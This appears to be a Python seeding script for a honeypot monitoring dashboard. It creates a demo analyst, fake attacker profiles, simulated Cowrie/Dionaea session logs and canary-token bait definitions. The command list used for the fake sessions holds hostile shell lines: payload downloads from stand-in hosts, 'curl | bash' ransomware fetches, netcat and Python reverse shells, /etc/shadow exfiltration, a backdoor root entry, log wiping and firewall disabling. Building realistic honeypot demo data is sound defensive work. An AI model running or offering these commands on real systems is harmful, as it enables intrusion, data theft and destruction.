from __future__ import annotations

import asyncio
import logging
import uuid
from datetime import datetime, timedelta

from sqlalchemy import func, select

from config import CAIRO_TZ, cairo_iso, Settings, get_settings
from database import get_db_context, init_db
from models import Alert, AttackerProfile, CanaryToken, SessionLog, User
from services.auth import get_password_hash

logger = logging.getLogger(__name__)


def _demo_bootstrap_enabled(settings: Settings) -> bool:
    return bool(
        settings.DEMO_BOOTSTRAP
        and settings.DEMO_USER_EMAIL
        and settings.DEMO_USER_PASSWORD
    )


async def ensure_demo_user(session: Any, settings: Settings) -> bool:
    if not _demo_bootstrap_enabled(settings):
        return False

    result = await session.execute(select(User).where(User.email == settings.DEMO_USER_EMAIL))
    user = result.scalar_one_or_none()
    hashed_password = get_password_hash(settings.DEMO_USER_PASSWORD or "")

    if user is None:
        user = User(
            email=settings.DEMO_USER_EMAIL or "",
            hashed_password=hashed_password,
            role=settings.DEMO_USER_ROLE,
            is_active=True,
        )
        session.add(user)
        logger.info("Created demo analyst account for %s", settings.DEMO_USER_EMAIL)
    else:
        user.hashed_password = hashed_password
        user.role = settings.DEMO_USER_ROLE
        user.is_active = True
        logger.info("Updated demo analyst account for %s", settings.DEMO_USER_EMAIL)

    await session.flush()
    return True


_DEMO_ATTACKERS = [
    {"ip": "185.220.101.34", "country": "Germany", "city": "Berlin", "isp": "Tor Exit Node",
     "threat_score": 0.92, "threat_level": 4, "vpn_detected": True, "canary_triggered": True},
    {"ip": "45.33.32.156", "country": "United States", "city": "Dallas", "isp": "Linode LLC",
     "threat_score": 0.68, "threat_level": 3, "vpn_detected": False, "canary_triggered": True},
    {"ip": "103.235.46.91", "country": "China", "city": "Shanghai", "isp": "China Telecom",
     "threat_score": 0.85, "threat_level": 4, "vpn_detected": True, "canary_triggered": False},
    {"ip": "5.188.62.18", "country": "Russia", "city": "Moscow", "isp": "Petersburg Internet",
     "threat_score": 0.74, "threat_level": 3, "vpn_detected": True, "canary_triggered": False},
    {"ip": "91.134.208.77", "country": "France", "city": "Paris", "isp": "OVH SAS",
     "threat_score": 0.55, "threat_level": 2, "vpn_detected": False, "canary_triggered": False},
    {"ip": "181.214.206.189", "country": "Brazil", "city": "Sao Paulo", "isp": "Host1Plus",
     "threat_score": 0.42, "threat_level": 2, "vpn_detected": False, "canary_triggered": False},
    {"ip": "14.139.185.67", "country": "India", "city": "Mumbai", "isp": "BSNL",
     "threat_score": 0.31, "threat_level": 1, "vpn_detected": False, "canary_triggered": False},
    {"ip": "197.237.128.12", "country": "Kenya", "city": "Nairobi", "isp": "Safaricom",
     "threat_score": 0.22, "threat_level": 1, "vpn_detected": False, "canary_triggered": False},
    {"ip": "58.65.197.210", "country": "Pakistan", "city": "Karachi", "isp": "Cybernet",
     "threat_score": 0.78, "threat_level": 3, "vpn_detected": True, "canary_triggered": True},
    {"ip": "200.68.136.50", "country": "Mexico", "city": "Mexico City", "isp": "Telmex",
     "threat_score": 0.48, "threat_level": 2, "vpn_detected": False, "canary_triggered": False},
    {"ip": "178.128.200.87", "country": "Greece", "city": "Athens", "isp": "DigitalOcean",
     "threat_score": 0.88, "threat_level": 4, "vpn_detected": True, "canary_triggered": True},
    {"ip": "41.215.92.33", "country": "Nigeria", "city": "Lagos", "isp": "MTN Nigeria",
     "threat_score": 0.65, "threat_level": 3, "vpn_detected": False, "canary_triggered": False},
]

_DEMO_COMMANDS_BY_LEVEL = {
    0: ["ls", "pwd", "whoami"],
    1: ["ls -la", "id", "uname -a", "cat /etc/passwd", "ps aux"],
    2: ["wget http://malware.example.com/payload.sh", "chmod +x payload.sh",
        "nmap -sS 192.168.1.0/24", "curl http://evil.cc/rat", "cat /etc/shadow",
        "ssh user@10.0.0.5", "tftp -g -r backdoor 192.168.1.100"],
    3: ["sudo su", "echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd",
        "./payload.sh", "nc -e /bin/bash 10.0.0.1 4444",
        "scp /etc/shadow attacker@remote:~/loot/", "crontab -l",
        "wget http://c2.server/bot.sh -O /tmp/.hidden", "curl -X POST http://exfil.cc/data -d @/etc/shadow"],
    4: ["rm -rf /var/log/*", "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
        "iptables -F", "echo '*/5 * * * * /tmp/.persist.sh' | crontab -",
        "base64 /etc/shadow | nc attacker.cc 1337",
        "curl -s http://c2.server/ransomware | bash",
        "systemctl disable firewalld", "cat /proc/1/environ | xargs -0 -n1 echo"],
}


async def seed_demo_data(session: Any, settings: Settings) -> None:
    if not _demo_bootstrap_enabled(settings):
        return

    existing = await session.execute(select(func.count(AttackerProfile.ip)))
    profile_count = existing.scalar()
    if profile_count > 0:
        logger.info("Demo data already exists (%d profiles), skipping seed", profile_count)
        return

    now = datetime.now(CAIRO_TZ).replace(tzinfo=None)
    logger.info("Seeding demo attack data (%d attackers)...", len(_DEMO_ATTACKERS))

    profiles: list[AttackerProfile] = []
    for i, atk in enumerate(_DEMO_ATTACKERS):
        first_seen = now - timedelta(hours=23 - i * 2)
        profile = AttackerProfile(
            ip=atk["ip"],
            country=atk["country"],
            city=atk["city"],
            isp=atk["isp"],
            vpn_detected=atk["vpn_detected"],
            threat_score=atk["threat_score"],
            threat_level=atk["threat_level"],
            first_seen=first_seen,
            last_seen=now - timedelta(minutes=(12 - i) * 10),
            total_sessions=atk["threat_level"] + 1,
            canary_triggered=atk["canary_triggered"],
            canary_max_difficulty=atk["threat_level"] if atk["canary_triggered"] else 0,
            canary_trigger_count=atk["threat_level"] if atk["canary_triggered"] else 0,
            cumulative_canary_score=min(1.0, atk["threat_score"] - 0.2) if atk["canary_triggered"] else 0.0,
        )
        session.add(profile)
        profiles.append(profile)

    for profile in profiles:
        level = profile.threat_level
        sessions_to_create = max(1, level)
        for s in range(sessions_to_create):
            sid = str(uuid.uuid4())
            start_time = profile.first_seen + timedelta(hours=s)
            end_time = start_time + timedelta(minutes=10 + (level * 15))

            cmds = _DEMO_COMMANDS_BY_LEVEL.get(level, _DEMO_COMMANDS_BY_LEVEL[1])
            import random
            selected_cmds = random.sample(cmds, min(len(cmds), level + 1 + s))
            commands = [
                {"timestamp": cairo_iso(start_time + timedelta(seconds=j * 30)),
                 "command": cmd, "output": ""}
                for j, cmd in enumerate(selected_cmds)
            ]

            session_log = SessionLog(
                id=sid,
                attacker_ip=profile.ip,
                honeypot="cowrie" if s % 2 == 0 else "dionaea",
                protocol="ssh" if s % 2 == 0 else "tcp",
                start_time=start_time,
                end_time=end_time,
                commands=commands,
                credentials_tried=[],
                malware_hashes=[],
                raw_log={"events": [{"eventid": "cowrie.session.connect", "timestamp": cairo_iso(start_time)}]},
            )
            session.add(session_log)

            if level >= 3:
                alert = Alert(
                    id=uuid.uuid4(),
                    session_id=sid,
                    attacker_ip=profile.ip,
                    threat_level=level,
                    message=f"High-risk activity from {profile.ip}: {selected_cmds[0] if selected_cmds else 'suspicious commands'}",
                    created_at=start_time + timedelta(minutes=5),
                    acknowledged=level == 3,
                )
                session.add(alert)

# Canary tokens form a graduated "level" ladder. Each one lives on a different
# surface whose real access difficulty matches its declared difficulty:
#   L0 open HTTP listing → L1 unlisted HTTP → L2 anon FTP →
#   L3 leaked /.git → L4 SSH /tmp → L5 SSH /root.
_CANARY_TOKENS = [
    {
        "id": "095a6bfa-9fbe-4a1f-b4fb-a1afa971cd98",
        "label": "Public Web Bug (open HTTP)",
        "description": "Benign tracking pixel on the tripwire HTTP server (8082); any open browse fires it.",
        "token_kind": "url",
        "difficulty": 0,
        "score_value": 0.05,
    },
    {
        "id": "19eee70f-aefd-4afb-ab06-3598d374876b",
        "label": "Exposed passwords.txt (HTTP honeypot)",
        "description": "Credential list reachable via the Dionaea HTTP honeypot (port 8081) at an unadvertised path.",
        "token_kind": "file",
        "difficulty": 1,
        "score_value": 0.15,
    },
    {
        "id": "083ee719-79d9-4174-b471-076ecc4248d7",
        "label": "AWS keys via anonymous FTP",
        "description": "aws_credentials retrievable over the Dionaea anonymous FTP honeypot (port 2121).",
        "token_kind": "aws_key",
        "difficulty": 2,
        "score_value": 0.25,
    },
    {
        "id": "b1d9f0c2-3a4e-4c7b-9f21-5d6e7a8b9c0d",
        "label": ".env in leaked .git repo",
        "description": "Production .env.production leaked via an exposed /.git/ on the tripwire (8082).",
        "token_kind": "file",
        "difficulty": 3,
        "score_value": 0.40,
    },
    {
        "id": "e8ca06a6-7123-4a08-9262-38c347248e51",
        "label": "Staging DB dump in /tmp (SSH)",
        "description": "database_backup.sql planted in /tmp/ in the Cowrie SSH honeypot (2222).",
        "token_kind": "file",
        "difficulty": 3,
        "score_value": 0.40,
    },
    {
        "id": "7aedcaf0-b627-4f6f-95e8-5e59d891147e",
        "label": "Root SSH key in /root/.ssh (SSH)",
        "description": "id_rsa planted in /root/.ssh/ inside the Cowrie SSH honeypot (port 2222) — root-level breach.",
        "token_kind": "file",
        "difficulty": 4,
        "score_value": 0.60,
    },
    {
        "id": "a1b2c3d4-e5f6-4071-8293-a4b5c6d7e8f9",
        "label": "Prod DB dump in /var/backups (SSH)",
        "description": "prod_db_dump.sql planted in /var/backups/db/ inside the Cowrie SSH honeypot (port 2222).",
        "token_kind": "file",
        "difficulty": 3,
        "score_value": 0.40,
    },
    {
        "id": "c3f1a2b4-5d6e-4f80-9a1b-2c3d4e5f6071",
        "label": "AWS credentials in ~/.aws (SSH)",
        "description": "AWS key id/secret at /home/deploy/.aws/credentials (Cowrie SSH honeypot 2222).",
        "token_kind": "aws_key",
        "difficulty": 3,
        "score_value": 0.40,
    },
    {
        "id": "d4e2b3c5-6e7f-4a91-8b2c-3d4e5f607182",
        "label": "App secrets in /opt/app/.env (SSH)",
        "description": "App .env with DB/JWT/Stripe/SMTP secrets at /opt/app/.env (Cowrie SSH honeypot 2222).",
        "token_kind": "file",
        "difficulty": 3,
        "score_value": 0.40,
    },
    {
        "id": "b7c8d9e0-1f23-4a56-8b9c-0d1e2f3a4b5c",
        "label": "Shell history breadcrumb (~/.bash_history) (SSH)",
        "description": "/root/.bash_history pointing at the scattered baits; early recon tripwire (Cowrie SSH 2222).",
        "token_kind": "file",
        "difficulty": 1,
        "score_value": 0.15,
    },
]


async def ensure_canary_tokens(session: Any) -> int:
    seeded = 0
    now = datetime.now(CAIRO_TZ).replace(tzinfo=None)
    canonical_ids = {uuid.UUID(ct["id"]) for ct in _CANARY_TOKENS}

    for ct in _CANARY_TOKENS:
        existing = await session.get(CanaryToken, uuid.UUID(ct["id"]))
        if existing is not None:
            changed = False
            for attr in ("label", "description", "token_kind", "difficulty"):
                if getattr(existing, attr) != ct[attr]:
                    setattr(existing, attr, ct[attr])
                    changed = True
            if existing.score_value == 0.0 and ct["score_value"] > 0:
                existing.score_value = ct["score_value"]
                changed = True
            if not existing.is_active:
                existing.is_active = True
                changed = True
            if changed:
                seeded += 1
            continue
        token = CanaryToken(
            id=uuid.UUID(ct["id"]),
            label=ct["label"],
            description=ct["description"],
            token_kind=ct["token_kind"],
            difficulty=ct["difficulty"],
            score_value=ct["score_value"],
            created_at=now - timedelta(days=1),
            trigger_count=0,
            is_active=True,
        )
        session.add(token)
        seeded += 1

    all_tokens = (await session.execute(select(CanaryToken))).scalars().all()
    for t in all_tokens:
        if t.id not in canonical_ids and t.trigger_count == 0:
            await session.delete(t)
            seeded += 1
            logger.info("Removed orphan token: %s (%s)", t.label, t.id)

    if seeded:
        logger.info("Seeded/updated %d canary tokens", seeded)
    return seeded


async def bootstrap_demo_user(settings: Settings | None = None) -> bool:
    current_settings = settings or get_settings()
    if not _demo_bootstrap_enabled(current_settings):
        logger.info("Demo bootstrap disabled; skipping demo analyst seed")
        return False

    init_db(current_settings.database_url)
    async with get_db_context() as session:
        result = await ensure_demo_user(session, current_settings)
        await ensure_canary_tokens(session)
        await seed_demo_data(session, current_settings)
        await session.commit()
        return result


def main() -> None:
    asyncio.run(bootstrap_demo_user())


if __name__ == "__main__":
    main()